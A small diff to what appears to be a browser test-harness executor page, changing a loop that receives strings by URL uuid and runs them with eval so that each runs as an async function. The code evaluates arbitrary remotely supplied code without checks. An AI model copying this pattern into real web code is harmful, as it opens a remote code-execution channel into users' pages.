@@ -5,8 +5,10 @@ const params = new URLSearchParams(window.location.search);
 const uuid = params.get('uuid');
 
 let executeOrders = async function() {
-  while(true)
-    eval(await receive(uuid));
+  while(true) {
+    let task = await receive(uuid);
+    eval(`(async () => {${task}})()`);
+  }
 };
 executeOrders();
 
